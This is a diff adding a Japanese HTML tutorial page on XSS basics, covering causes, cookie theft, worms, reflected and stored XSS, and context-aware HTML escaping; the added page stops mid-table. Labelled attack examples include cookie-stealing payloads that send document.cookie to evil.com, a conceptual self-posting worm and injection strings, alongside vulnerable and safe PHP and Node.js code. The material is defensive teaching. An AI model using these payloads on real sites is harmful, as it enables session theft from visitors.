@@ -1,0 +1,756 @@
+<!doctype html>
+<html lang="ja">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>XSSの基本｜Web脆弱性対策解説</title>
+<link rel="stylesheet" href="../../_解説HTML/style.css">
+</head>
+<body>
+<header class="topbar">
+  <div class="topbar-inner">
+    <a class="site" href="00-0_目次.html">Web脆弱性対策解説</a>
+    <span class="crumb"><a href="00-0_目次.html">目次</a> › 20 インジェクション › XSSの基本</span>
+    <button class="toc-btn" type="button">目次</button>
+  </div>
+</header>
+
+<div class="layout">
+  <nav class="toc" id="toc"><p class="toc-title">このページの目次</p><ol id="toc-list"></ol></nav>
+
+  <main>
+    <div class="hero">
+      <span class="eyebrow">20 インジェクション</span>
+      <h1>XSSの基本</h1>
+      <p class="lead">XSS（クロスサイトスクリプティング）は、Web ページに悪意ある JavaScript を紛れ込ませ、そのページを見た人のブラウザで実行させる攻撃です。このページでは、XSS が起きる理由（データが命令として読まれること）、Cookie の盗み出しやワームといった被害、反射型と持続型の違い、そして根本対策である HTML エスケープと、被害を減らす保険的対策までを、徳丸本（『体系的に学ぶ 安全なWebアプリケーションの作り方』）第5章に沿って解説します。</p>
+      <p class="meta">もとにしたノート：20_インジェクション/01_XSS基本編（徳丸本5章）・04_SQLインジェクションとXSS（ねる前エンジニアリング）</p>
+    </div>
+
+    <div class="callout key">
+      <p class="callout-title">ひとことで言うと</p>
+      <p>XSS は <strong>「ただの文字（データ）のつもりで画面に出した入力が、ブラウザに命令（HTML タグやスクリプト）として読まれてしまう」</strong> 穴です。対策の基本は、HTML にはめ込む直前に <strong>文字として表示される形に置き換える（HTML エスケープ）</strong> ことです。被害を受けるのは、書き込んだ人ではなく <strong>そのページを見た人</strong> です。</p>
+    </div>
+
+    <p>第4章では入力値の検証について学びました。第5章では <strong>出力（表示）処理</strong> に焦点を当て、<strong>クロスサイトスクリプティング（XSS）</strong> の仕組みと対策を解説します。</p>
+
+    <h2 id="sec-1"><span class="num">1.</span>クロスサイトスクリプティング（XSS）とは</h2>
+    <p><strong>クロスサイトスクリプティング（Cross-Site Scripting / XSS）</strong> は、Web ページに <strong>悪意ある JavaScript を注入</strong> し、閲覧者のブラウザ上で実行させる攻撃です。「注入（インジェクション）」とは、本来データが入るはずの場所に、命令として働く文字を紛れ込ませることです。</p>
+    <div class="table-wrap"><table>
+      <thead><tr><th>項目</th><th>内容</th></tr></thead>
+      <tbody>
+        <tr><td><strong>別名</strong></td><td>クロスサイト・スクリプティング</td></tr>
+        <tr><td><strong>分類</strong></td><td>インジェクション系脆弱性（徳丸本第4章）</td></tr>
+        <tr><td><strong>攻撃対象</strong></td><td>他ユーザーのブラウザ</td></tr>
+        <tr><td><strong>インターフェース</strong></td><td>HTML</td></tr>
+      </tbody>
+    </table></div>
+    <p>インジェクション全体の考え方は、71 セキュリティ基礎の <a href="../../71_セキュリティ基礎/00_全体像/40-3_インジェクションと暗号化の不備.html">インジェクションと暗号化の不備</a> でまとめています。</p>
+
+    <h3 id="sec-1-1">1.1 日常生活での例え</h3>
+    <div class="grid c2">
+      <div class="card"><h4>正常なWebページ</h4><p>掲示板に「こんにちは」と表示される。</p></div>
+      <div class="card"><h4>XSS</h4><p>掲示板に「こんにちは <code>&lt;script&gt;</code> 悪意あるコード <code>&lt;/script&gt;</code>」と書かれ、<strong>他の人が読むたびにスクリプトが動く</strong>。</p></div>
+    </div>
+
+    <h3 id="sec-1-2">1.2 攻撃者の目的</h3>
+    <div class="table-wrap"><table>
+      <thead><tr><th>目的</th><th>説明</th></tr></thead>
+      <tbody>
+        <tr><td><strong>セッション窃取</strong></td><td>Cookie からセッションID（ログイン状態を表す合言葉のような値）を盗み、なりすましログイン</td></tr>
+        <tr><td><strong>フィッシング</strong></td><td>偽のログインフォームを表示してパスワードを盗む</td></tr>
+        <tr><td><strong>キーロギング</strong></td><td>入力されたキー操作を外部に送信</td></tr>
+        <tr><td><strong>ページ改ざん</strong></td><td>表示内容を書き換える</td></tr>
+        <tr><td><strong>ワーム拡散</strong></td><td>悪意あるスクリプトを自動的に他ページへ投稿</td></tr>
+      </tbody>
+    </table></div>
+
+    <h3 id="sec-1-3">1.3 なぜ起きるか</h3>
+    <pre><code>ユーザー入力 → サーバー → HTMLにそのまま埋め込み → ブラウザが &lt;script&gt; を実行</code></pre>
+    <p><strong>根本原因：</strong>出力時に <strong>HTMLエスケープ</strong> を行わず、ユーザー入力をそのまま HTML に含めている。</p>
+
+    <h2 id="sec-2"><span class="num">2.</span>データと命令：XSS の根っこ</h2>
+    <p>XSS と SQLインジェクションは、根っこが同じ穴です。どちらも <strong>データのつもりで入れた文字が、命令として解釈されてしまう</strong> ことが原因で、対策も共通して <strong>データと命令の境界で分ける</strong> ことです。「記号を消す」より「そもそも混ぜない」が基本になります（SQL 側の話は <a href="20-3_SQLインジェクション.html">SQLインジェクション</a> で扱います）。</p>
+
+    <h3 id="sec-2-1">2.1 データと命令の違い</h3>
+    <div class="grid c2">
+      <div class="card"><h4>データ</h4><p>読まれるだけのもの（名前やコメント）。中に何が書いてあっても、本来は何も起きない。</p></div>
+      <div class="card"><h4>命令</h4><p>読み手がその通りに動くもの（「この人を探せ」「これを表示しろ」）。</p></div>
+    </div>
+    <p>どちらも <strong>同じ文字でできている</strong> ため、境目が曖昧になると取り違えが起きます。</p>
+
+    <h3 id="sec-2-2">2.2 画面でデータが命令に化けるまで</h3>
+    <ul>
+      <li>画面（HTML）も、段落の札（<code>&lt;p&gt;</code> のようなタグ）などのひな型にコメントをはめ込んで作っている</li>
+      <li>コメント欄に <code>&lt;script&gt;</code> の札で囲んだプログラムを書き込むと、ブラウザは尖った括弧（<code>&lt;</code> <code>&gt;</code>）を札（命令）として読み、中身がプログラムとして動く</li>
+      <li>動く場所は、そのコメントを <strong>開いた別の人のブラウザ</strong>。見た人がログインしていれば、その人の権限で動いてしまうことがある。<strong>書いた人ではなく見た人が被害を受ける</strong></li>
+    </ul>
+    <p>実務では、たとえば「口コミのコメント欄に書かれたコメントを別の人が開いたら、中身がプログラムとして動き出した」という形で表に出ます。</p>
+
+    <h3 id="sec-2-3">2.3 対策：文字として表示する形に変える</h3>
+    <ul>
+      <li>HTML にはめ込む直前に、入力を文字として表示する形に置き換える（<code>&lt;</code> → <code>&amp;lt;</code>）。これを <strong>エスケープ</strong> と呼ぶ。「スクリプト」という文字が画面に見えるだけで動かない</li>
+      <li>自分で探して書き換えるのではなく、React のような最近の部品（フレームワーク）は波括弧（<code>{ }</code>）で表示すると <strong>自動でエスケープ</strong> してくれる</li>
+      <li>危ないのは、自動の仕組みを外す書き方
+        <ul>
+          <li><code>innerHTML</code>：中身を HTML として入れるので、札があれば命令として読まれる</li>
+          <li>React の <code>dangerouslySetInnerHTML</code>：名前で「危険」と警告している</li>
+        </ul>
+      </li>
+      <li>安全な書き方：<code>textContent</code> は文字として入れる。React では波括弧で出せば十分</li>
+    </ul>
+    <p><code>innerHTML</code> と <code>textContent</code>、React の書き方を並べたコード例は、<a href="../../71_セキュリティ基礎/00_全体像/40-3_インジェクションと暗号化の不備.html#sec-5">71 セキュリティ基礎「XSS：脆弱なコードと安全なコード」</a> にあります。</p>
+
+    <h2 id="sec-3"><span class="num">3.</span>XSS によるクッキー値の盗み出し</h2>
+    <p>XSS で最も恐れられる被害のひとつが、<strong>Cookie（セッションID）の盗み出し</strong> です。Cookie は、サイトがブラウザに保存させる小さなデータで、ログイン状態の目印として使われます。</p>
+
+    <h3 id="sec-3-1">3.1 攻撃の流れ</h3>
+    <ol class="steps">
+      <li>攻撃者が XSS のペイロード（攻撃コード）をページに仕込む</li>
+      <li>被害者がそのページを開く</li>
+      <li>ブラウザ上で JavaScript が実行される</li>
+      <li><code>document.cookie</code> で Cookie を読み取り、攻撃者のサーバーへ送信</li>
+      <li>攻撃者が盗んだセッションIDで被害者になりすます</li>
+    </ol>
+    <figure>
+    <svg viewBox="0 0 720 280" role="img" aria-label="XSSによるCookie盗み出しの流れ。被害者のブラウザで正規サイトのページに仕込まれたスクリプトが動き、Cookieを攻撃者のサーバーへ送る。攻撃者はそのセッションIDで正規サイトになりすましアクセスする">
+      <defs>
+        <marker id="arw201a" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" class="d-arrowhead"/></marker>
+        <marker id="arw201b" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" class="d-arrowhead-bad"/></marker>
+      </defs>
+      <rect x="20" y="30" width="190" height="80" rx="8" class="d-box"/>
+      <text x="115" y="62" text-anchor="middle" class="d-text-bold">正規サイト</text>
+      <text x="115" y="86" text-anchor="middle" class="d-text-sub">example.com</text>
+      <rect x="265" y="20" width="200" height="130" rx="8" class="d-box-accent"/>
+      <text x="365" y="46" text-anchor="middle" class="d-text-bold">被害者のブラウザ</text>
+      <rect x="282" y="60" width="166" height="74" rx="8" class="d-box-bad"/>
+      <text x="365" y="86" text-anchor="middle" class="d-text">仕込まれた script</text>
+      <text x="365" y="108" text-anchor="middle" class="d-text-sub">document.cookie</text>
+      <text x="365" y="124" text-anchor="middle" class="d-text-sub">を読む</text>
+      <line x1="210" y1="70" x2="280" y2="70" class="d-line" marker-end="url(#arw201a)"/>
+      <text x="238" y="60" text-anchor="middle" class="d-text-sub">②③</text>
+      <rect x="520" y="30" width="180" height="80" rx="8" class="d-box-bad"/>
+      <text x="610" y="62" text-anchor="middle" class="d-text-bold">攻撃者のサーバー</text>
+      <text x="610" y="86" text-anchor="middle" class="d-text-sub">evil.com</text>
+      <line x1="448" y1="80" x2="518" y2="80" class="d-line-bad" marker-end="url(#arw201b)"/>
+      <text x="484" y="70" text-anchor="middle" class="d-text-sub">④</text>
+      <rect x="520" y="180" width="180" height="70" rx="8" class="d-box-bad"/>
+      <text x="610" y="210" text-anchor="middle" class="d-text-bold">攻撃者</text>
+      <text x="610" y="232" text-anchor="middle" class="d-text-sub">盗んだセッションID</text>
+      <line x1="610" y1="110" x2="610" y2="178" class="d-line-bad" marker-end="url(#arw201b)"/>
+      <path d="M520,200 L115,200 L115,112" class="d-line-bad" marker-end="url(#arw201b)"/>
+      <text x="320" y="192" text-anchor="middle" class="d-text-sub">⑤ 被害者になりすましてアクセス</text>
+      <path d="M520,238 L45,238 L45,112" class="d-line-dash" marker-end="url(#arw201a)"/>
+      <text x="280" y="260" text-anchor="middle" class="d-text-sub">① XSS の穴を突いて攻撃コードを仕込む</text>
+    </svg>
+    <figcaption>図：スクリプトは正規サイトのページ上で動くため Cookie を読め、それを外部へ送ってしまう（番号は上の手順に対応）</figcaption>
+    </figure>
+
+    <h3 id="sec-3-2">3.2 攻撃コードの例</h3>
+    <span class="code-label bad">✕ 攻撃コード：別サイトへ移動させ、URL に Cookie を付ける</span>
+    <pre><code>&lt;script&gt;
+  document.location =
+    'https://evil.com/steal?cookie=' + encodeURIComponent(document.cookie);
+&lt;/script&gt;</code></pre>
+    <span class="code-label bad">✕ 攻撃コード：より目立たない方法（画像タグを利用）</span>
+    <pre><code>// より目立たない方法（画像タグを利用）
+new Image().src = 'https://evil.com/steal?cookie=' + document.cookie;</code></pre>
+    <p>2つ目は画像を読み込むふりをして、裏で攻撃者のサーバーにリクエストを送らせます。画面が移動しないので、被害者は気づきにくくなります。</p>
+
+    <h3 id="sec-3-3">3.3 なぜ Cookie が読めるか</h3>
+    <ul>
+      <li>同一オリジン（スキーム・ホスト・ポートが同じ範囲）のページで実行された JavaScript は <code>document.cookie</code> にアクセスできる</li>
+      <li>XSS により <strong>そのサイトのページ上</strong> でスクリプトが動くため、Cookie も読める</li>
+    </ul>
+    <p>同一オリジンポリシーは「別サイトのスクリプトにはデータを読ませない」ルールですが、XSS は攻撃者のスクリプトを <strong>正規サイトの内側</strong> で動かすため、このしきりを素通りしてしまいます（→ <a href="10-1_受動的攻撃と同一オリジンポリシー.html#sec-3">同一オリジンポリシー</a>）。</p>
+
+    <h3 id="sec-3-4">3.4 対策の方向性</h3>
+    <div class="table-wrap"><table>
+      <thead><tr><th>対策</th><th>効果</th></tr></thead>
+      <tbody>
+        <tr><td><strong>HTMLエスケープ</strong></td><td>XSS 自体を防ぐ（根本対策）</td></tr>
+        <tr><td><strong>HttpOnly 属性</strong></td><td>JavaScript から Cookie を読めなくする（保険）</td></tr>
+      </tbody>
+    </table></div>
+
+    <h2 id="sec-4"><span class="num">4.</span>XSS を悪用したワーム</h2>
+    <p><strong>XSS ワーム</strong> とは、XSS を利用して <strong>悪意あるスクリプトを自動的に拡散</strong> させる攻撃です。ワームとは、自分自身を複製して広がっていくプログラムのことです。ソーシャルネットワークの掲示板やコメント欄で特に問題になります。</p>
+
+    <h3 id="sec-4-1">4.1 攻撃の流れ</h3>
+    <ol class="steps">
+      <li>攻撃者が掲示板に XSS ペイロードを投稿</li>
+      <li>ユーザーAがページを閲覧 → スクリプト実行</li>
+      <li>スクリプトがユーザーAの権限で「同じペイロード」を自動投稿</li>
+      <li>ユーザーB, C, D... が閲覧 → さらに拡散</li>
+      <li>指数関数的に感染が広がる</li>
+    </ol>
+
+    <h3 id="sec-4-2">4.2 ワームのペイロード例（概念）</h3>
+    <span class="code-label bad">✕ 攻撃コード（概念）：閲覧者の権限でコメントを自動投稿</span>
+    <pre><code>&lt;script&gt;
+  // ログイン済みユーザーの権限でコメントを自動投稿
+  fetch('/api/comments', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      text: '&lt;script&gt;/* 同じ攻撃コード */&lt;/script&gt;'
+    })
+  });
+&lt;/script&gt;</code></pre>
+    <p><code>fetch</code> はブラウザから HTTP リクエストを送る関数です。同じサイトへのリクエストなので、閲覧者の Cookie が自動で付き、<strong>閲覧者本人が投稿したのと同じ扱い</strong> になります。</p>
+    <div class="callout warn">
+      <p class="callout-title">補足：この例はあくまで概念です</p>
+      <p>実際の HTML では、<code>&lt;script&gt;</code> の中の文字列に <code>&lt;/script&gt;</code> と書くと、ブラウザはそこで外側の script 要素が終わったと解釈します。この例はそのままでは動かず、「同じコードを複製して投稿する」という考え方を示すためのものです。</p>
+    </div>
+
+    <h3 id="sec-4-3">4.3 反射型 vs 持続型（ワーム化しやすさ）</h3>
+    <div class="table-wrap"><table>
+      <thead><tr><th>種類</th><th>ワーム化しやすさ</th></tr></thead>
+      <tbody>
+        <tr><td><strong>持続型（Stored）</strong></td><td>非常に高い（DBに保存され、全訪問者が実行）</td></tr>
+        <tr><td><strong>反射型（Reflected）</strong></td><td>低い（被害者が特定URLを開いたときのみ）</td></tr>
+      </tbody>
+    </table></div>
+    <p><strong>持続型 XSS</strong> は掲示板・SNS・Wiki など <strong>ユーザー入力が保存される場所</strong> で特に危険です。2つの違いは次の章で詳しく見ます。</p>
+
+    <h2 id="sec-5"><span class="num">5.</span>反射型 XSS と持続型 XSS</h2>
+    <p>XSS は、悪意あるスクリプトが <strong>どこに・どう残るか</strong> によって2種類に分けられます。</p>
+    <figure>
+    <svg viewBox="0 0 720 300" role="img" aria-label="反射型XSSと持続型XSSの流れの比較。反射型は攻撃者が作ったURLを被害者が開き、サーバーが入力をそのままレスポンスに返す。持続型は攻撃者の投稿がDBに保存され、閲覧した全員にスクリプトが返される">
+      <defs>
+        <marker id="arw201c" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" class="d-arrowhead"/></marker>
+        <marker id="arw201d" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" class="d-arrowhead-bad"/></marker>
+      </defs>
+      <text x="20" y="26" class="d-text-bold">反射型（保存されない）</text>
+      <rect x="20" y="40" width="130" height="60" rx="8" class="d-box-bad"/>
+      <text x="85" y="66" text-anchor="middle" class="d-text-bold">攻撃者</text>
+      <text x="85" y="86" text-anchor="middle" class="d-text-sub">罠のURLを作る</text>
+      <line x1="150" y1="70" x2="208" y2="70" class="d-line-bad" marker-end="url(#arw201d)"/>
+      <text x="179" y="60" text-anchor="middle" class="d-text-sub">メール等</text>
+      <rect x="210" y="40" width="150" height="60" rx="8" class="d-box-accent"/>
+      <text x="285" y="66" text-anchor="middle" class="d-text-bold">被害者</text>
+      <text x="285" y="86" text-anchor="middle" class="d-text-sub">URLをクリック</text>
+      <line x1="360" y1="62" x2="448" y2="62" class="d-line" marker-end="url(#arw201c)"/>
+      <text x="404" y="54" text-anchor="middle" class="d-text-sub">?q=&lt;script&gt;</text>
+      <rect x="450" y="40" width="160" height="60" rx="8" class="d-box"/>
+      <text x="530" y="66" text-anchor="middle" class="d-text-bold">サーバー</text>
+      <text x="530" y="86" text-anchor="middle" class="d-text-sub">q をそのまま表示</text>
+      <path d="M530,100 L530,124 L285,124 L285,102" class="d-line-bad" marker-end="url(#arw201d)"/>
+      <text x="408" y="142" text-anchor="middle" class="d-text-sub">その場で返す → その人のブラウザで実行</text>
+
+      <line x1="20" y1="160" x2="700" y2="160" class="d-line-dash"/>
+
+      <text x="20" y="188" class="d-text-bold">持続型（DBに保存される）</text>
+      <rect x="20" y="202" width="130" height="60" rx="8" class="d-box-bad"/>
+      <text x="85" y="228" text-anchor="middle" class="d-text-bold">攻撃者</text>
+      <text x="85" y="248" text-anchor="middle" class="d-text-sub">コメントに投稿</text>
+      <line x1="150" y1="232" x2="208" y2="232" class="d-line-bad" marker-end="url(#arw201d)"/>
+      <rect x="210" y="202" width="150" height="60" rx="8" class="d-box"/>
+      <text x="285" y="228" text-anchor="middle" class="d-text-bold">サーバー＋DB</text>
+      <text x="285" y="248" text-anchor="middle" class="d-text-sub">script が保存される</text>
+      <line x1="360" y1="232" x2="448" y2="232" class="d-line-bad" marker-end="url(#arw201d)"/>
+      <text x="404" y="222" text-anchor="middle" class="d-text-sub">閲覧のたび</text>
+      <rect x="450" y="190" width="80" height="34" rx="8" class="d-box-accent"/>
+      <text x="490" y="212" text-anchor="middle" class="d-text">閲覧者A</text>
+      <rect x="540" y="190" width="80" height="34" rx="8" class="d-box-accent"/>
+      <text x="580" y="212" text-anchor="middle" class="d-text">閲覧者B</text>
+      <rect x="450" y="238" width="80" height="34" rx="8" class="d-box-accent"/>
+      <text x="490" y="260" text-anchor="middle" class="d-text">閲覧者C</text>
+      <rect x="540" y="238" width="80" height="34" rx="8" class="d-box-accent"/>
+      <text x="580" y="260" text-anchor="middle" class="d-text">…</text>
+      <text x="535" y="292" text-anchor="middle" class="d-text-sub">ページを見た全員のブラウザで実行</text>
+    </svg>
+    <figcaption>図：反射型は「URL を開いた人」だけ、持続型は「ページを見た全員」が被害を受ける</figcaption>
+    </figure>
+
+    <h3 id="sec-5-1">5.1 反射型XSS（Reflected XSS / 非持続型）</h3>
+    <p><strong>リクエストに含まれた入力が、その場でレスポンスに反映</strong> されるタイプです。サーバーに保存されません。「反射」は、送った入力が鏡のようにそのまま跳ね返ってくることを表しています。</p>
+    <pre><code>攻撃者が悪意あるURLを作成
+  ↓
+https://example.com/search?q=&lt;script&gt;alert(1)&lt;/script&gt;
+  ↓
+被害者がURLをクリック
+  ↓
+サーバーが q の値を検索結果ページに表示
+  ↓
+&lt;script&gt; が実行される</code></pre>
+    <div class="table-wrap"><table>
+      <thead><tr><th>特徴</th><th>内容</th></tr></thead>
+      <tbody>
+        <tr><td><strong>保存</strong></td><td>サーバーに保存されない</td></tr>
+        <tr><td><strong>拡散</strong></td><td>URLを踏ませる必要がある（フィッシング等）</td></tr>
+        <tr><td><strong>発生箇所</strong></td><td>検索結果、エラーメッセージ、リダイレクト</td></tr>
+      </tbody>
+    </table></div>
+
+    <h3 id="sec-5-2">5.2 持続型XSS（Stored XSS / 蓄積型）</h3>
+    <p><strong>悪意あるスクリプトがサーバー（DB等）に保存</strong> され、ページを表示するたびに実行されます。</p>
+    <pre><code>攻撃者がコメント欄に &lt;script&gt;...&lt;/script&gt; を投稿
+  ↓
+DBに保存される
+  ↓
+他のユーザーがページを閲覧
+  ↓
+全員のブラウザでスクリプトが実行される</code></pre>
+    <div class="table-wrap"><table>
+      <thead><tr><th>特徴</th><th>内容</th></tr></thead>
+      <tbody>
+        <tr><td><strong>保存</strong></td><td>DB・ファイル等に永続化</td></tr>
+        <tr><td><strong>拡散</strong></td><td>ページを見た全員が被害</td></tr>
+        <tr><td><strong>発生箇所</strong></td><td>掲示板、コメント、プロフィール、Wiki</td></tr>
+      </tbody>
+    </table></div>
+
+    <h3 id="sec-5-3">5.3 比較表</h3>
+    <div class="table-wrap"><table>
+      <thead><tr><th></th><th>反射型XSS</th><th>持続型XSS</th></tr></thead>
+      <tbody>
+        <tr><td><strong>別名</strong></td><td>非持続型</td><td>蓄積型</td></tr>
+        <tr><td><strong>保存</strong></td><td>なし</td><td>あり</td></tr>
+        <tr><td><strong>被害者</strong></td><td>URLを開いた人</td><td>ページを閲覧した全員</td></tr>
+        <tr><td><strong>危険度</strong></td><td>中</td><td><strong>高</strong></td></tr>
+        <tr><td><strong>ワーム化</strong></td><td>しにくい</td><td>しやすい</td></tr>
+      </tbody>
+    </table></div>
+    <p>このほか、サーバーを経由せずブラウザ側の JavaScript の処理だけで起きる <strong>DOM ベース XSS</strong> もあります（<a href="../../71_セキュリティ基礎/00_全体像/40-3_インジェクションと暗号化の不備.html#sec-5">71 セキュリティ基礎</a> の表を参照）。</p>
+
+    <h2 id="sec-6"><span class="num">6.</span>HTML エスケープの概念</h2>
+    <p><strong>HTMLエスケープ</strong> は、XSS を防ぐ <strong>最も基本的で重要な対策</strong> です。特殊文字を HTML として解釈されない形式（<strong>文字参照</strong>：<code>&amp;lt;</code> のように <code>&amp;</code> で始まり <code>;</code> で終わる、文字を表す書き方）に変換します。</p>
+
+    <h3 id="sec-6-1">6.1 仕組み</h3>
+    <pre><code>ユーザー入力:  &lt;script&gt;alert(1)&lt;/script&gt;
+       ↓ HTMLエスケープ
+出力:          &amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;
+       ↓ ブラウザの表示
+画面表示:      &lt;script&gt;alert(1)&lt;/script&gt;  （テキストとして表示、実行されない）</code></pre>
+
+    <h3 id="sec-6-2">6.2 エスケープ対象の文字</h3>
+    <div class="table-wrap"><table>
+      <thead><tr><th>文字</th><th>エスケープ後</th><th>理由</th></tr></thead>
+      <tbody>
+        <tr><td><code>&lt;</code></td><td><code>&amp;lt;</code></td><td>タグの開始を防ぐ</td></tr>
+        <tr><td><code>&gt;</code></td><td><code>&amp;gt;</code></td><td>タグの終了を防ぐ</td></tr>
+        <tr><td><code>"</code></td><td><code>&amp;quot;</code></td><td>属性値の脱出を防ぐ</td></tr>
+        <tr><td><code>'</code></td><td><code>&amp;#x27;</code> または <code>&amp;apos;</code></td><td>属性値の脱出を防ぐ</td></tr>
+        <tr><td><code>&amp;</code></td><td><code>&amp;amp;</code></td><td>実体参照の開始を防ぐ</td></tr>
+      </tbody>
+    </table></div>
+
+    <h3 id="sec-6-3">6.3 エスケープのタイミング</h3>
+    <span class="code-label bad">✕ 入力時にエスケープ</span>
+    <pre><code>DBにエスケープ済みデータが保存され、二重エスケープの原因に</code></pre>
+    <span class="code-label good">○ 出力時にエスケープ</span>
+    <pre><code>表示直前に変換（推奨）</code></pre>
+    <p>二重エスケープとは、すでに変換した <code>&amp;lt;</code> をもう一度変換して <code>&amp;amp;lt;</code> にしてしまい、画面に「&amp;lt;」という記号がそのまま出てしまう状態です。</p>
+    <p><strong>原則：</strong><strong>出力する場所（コンテキスト）に応じて</strong> エスケープする。コンテキストとは、「HTML の本文」「属性の値」「JavaScript の中」のような、文字が置かれる場所の種類のことです。</p>
+    <div class="table-wrap"><table>
+      <thead><tr><th>出力先</th><th>エスケープ方法</th></tr></thead>
+      <tbody>
+        <tr><td>HTML本文</td><td>HTMLエスケープ</td></tr>
+        <tr><td>HTML属性</td><td>HTML属性エスケープ</td></tr>
+        <tr><td>JavaScript</td><td>JavaScriptエスケープ</td></tr>
+        <tr><td>URL</td><td>URLエンコード</td></tr>
+      </tbody>
+    </table></div>
+
+    <h2 id="sec-7"><span class="num">7.</span>要素内容の XSS と出力コンテキスト</h2>
+    <p>HTML には <strong>要素内容（Element Content）</strong> と <strong>属性値（Attribute Value）</strong> など、出力コンテキストが異なります。コンテキストを間違えると、エスケープしても XSS を防げない場合があります。</p>
+
+    <h3 id="sec-7-1">7.1 要素内容への XSS</h3>
+    <p>HTML タグの <strong>中身</strong>（<code>&lt;p&gt;</code> と <code>&lt;/p&gt;</code> の間など）にユーザー入力を出力するケースです。</p>
+    <span class="code-label bad">✕ 脆弱：ユーザー入力 name をそのまま出力</span>
+    <pre><code>&lt;p&gt;こんにちは、&lt;?= $name ?&gt;さん！&lt;/p&gt;
+
+&lt;!-- 攻撃入力: &lt;script&gt;alert(1)&lt;/script&gt; --&gt;
+&lt;p&gt;こんにちは、&lt;script&gt;alert(1)&lt;/script&gt;さん！&lt;/p&gt;</code></pre>
+    <span class="code-label good">○ 安全：HTMLエスケープして出力</span>
+    <pre><code>&lt;p&gt;こんにちは、&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;さん！&lt;/p&gt;</code></pre>
+    <p><code>&lt;?= $name ?&gt;</code> は PHP で変数の値をそのまま出力する短い書き方です。</p>
+
+    <h3 id="sec-7-2">7.2 属性値への XSS</h3>
+    <p>HTML 属性の <strong>値</strong> にユーザー入力を出力するケースです。属性値は <strong>引用符で囲む</strong> 必要があります。</p>
+    <span class="code-label bad">✕ 脆弱：属性値にエスケープなし</span>
+    <pre><code>&lt;input type="text" value="&lt;?= $keyword ?&gt;"&gt;
+
+&lt;!-- 攻撃入力: " onmouseover="alert(1) --&gt;
+&lt;input type="text" value="" onmouseover="alert(1)"&gt;</code></pre>
+    <span class="code-label good">○ 安全：エスケープ ＋ ダブルクォートで囲む</span>
+    <pre><code>&lt;input type="text" value="&amp;quot; onmouseover=&amp;quot;alert(1)"&gt;</code></pre>
+    <p>攻撃入力の先頭の <code>"</code> で value 属性が閉じられ、<code>onmouseover</code>（マウスが乗ったときに動く処理を指定する属性＝イベントハンドラ）が新しい属性として追加されてしまいます。<code>"</code> を <code>&amp;quot;</code> にすれば、属性の外に出られません。</p>
+
+    <h3 id="sec-7-3">7.3 JavaScript コンテキストへの XSS</h3>
+    <span class="code-label bad">✕ 危険：JS文字列に直接埋め込み</span>
+    <pre><code>&lt;script&gt;var name = '&lt;?= $name ?&gt;';&lt;/script&gt;
+
+&lt;!-- 攻撃入力: '; alert(1); // --&gt;
+&lt;script&gt;var name = ''; alert(1); //';&lt;/script&gt;</code></pre>
+    <p><strong>対策：</strong>HTMLエスケープだけでは不十分。JavaScript 用のエスケープ、または JSON 形式で安全に渡す。</p>
+
+    <h3 id="sec-7-4">7.4 コンテキスト別の対策まとめ</h3>
+    <div class="table-wrap"><table>
+      <thead><tr><th>コンテキスト</th><th>対策</th></tr></thead>
+      <tbody>
+        <tr><td>HTML要素内容</td><td>HTMLエスケープ</td></tr>
+        <tr><td>HTML属性値</td><td>HTML属性エスケープ ＋ 引用符で囲む</td></tr>
+        <tr><td>JavaScript</td><td>JSエスケープ / <code>JSON.stringify</code></td></tr>
+        <tr><td>CSS</td><td>CSSエスケープ</td></tr>
+        <tr><td>URL</td><td>URLエンコード ＋ 許可スキームの検証</td></tr>
+      </tbody>
+    </table></div>
+    <p>属性値・URL（<code>href</code> / <code>src</code>）・script 要素の中など、コンテキストごとの詳しい書き方は次のページ <a href="20-2_XSS発展編.html">XSS発展編：属性・JavaScript内のXSS</a> で扱います。</p>
+
+    <h2 id="sec-8"><span class="num">8.</span>XSS 対策の基本：出力時のエスケープ</h2>
+    <p>XSS 対策の基本は、第4章の <strong>入力‐処理‐出力モデル</strong>（アプリの処理を「入力を受け取る → 処理する → 結果を出力する」の3段階に分けて考えるモデル）の「出力」段階で実施します。</p>
+    <pre><code>防御の優先順位：
+
+1. 出力時のエスケープ（根本対策）  ← 最優先
+2. 入力値検証（補助）
+3. HttpOnly、CSP 等（保険的対策）</code></pre>
+
+    <h3 id="sec-8-1">8.1 脆弱なコード vs 安全なコード</h3>
+    <span class="code-label bad">✕ 脆弱（PHP）</span>
+    <pre><code>$name = $_GET['name'];
+echo "&lt;p&gt;こんにちは、{$name}さん！&lt;/p&gt;";</code></pre>
+    <span class="code-label good">○ 安全（PHP）</span>
+    <pre><code>$name = htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8');
+echo "&lt;p&gt;こんにちは、{$name}さん！&lt;/p&gt;";</code></pre>
+    <span class="code-label bad">✕ 脆弱（JavaScript / Node.js）</span>
+    <pre><code>const name = req.query.name;
+res.send(`&lt;p&gt;こんにちは、${name}さん！&lt;/p&gt;`);</code></pre>
+    <span class="code-label good">○ 安全（テンプレートエンジンの自動エスケープを利用）</span>
+    <pre><code>// EJS, Pug, React 等はデフォルトでエスケープ
+res.render('greeting', { name: req.query.name });</code></pre>
+    <p>Node.js の例のように、バッククォートで囲んだテンプレート文字列の中に <code>${name}</code> で埋め込む書き方も、文字列の足し算と同じく <strong>データと命令の境界を消してしまいます</strong>。動いてしまうので気づきにくい点に注意しましょう。</p>
+
+    <h3 id="sec-8-2">8.2 テンプレートエンジンを使う</h3>
+    <p><strong>テンプレートエンジン</strong> とは、HTML のひな型に値をはめ込んで画面を作る仕組みです。多くは、はめ込む値を自動でエスケープします。</p>
+    <div class="table-wrap"><table>
+      <thead><tr><th>テンプレート</th><th>自動エスケープ</th></tr></thead>
+      <tbody>
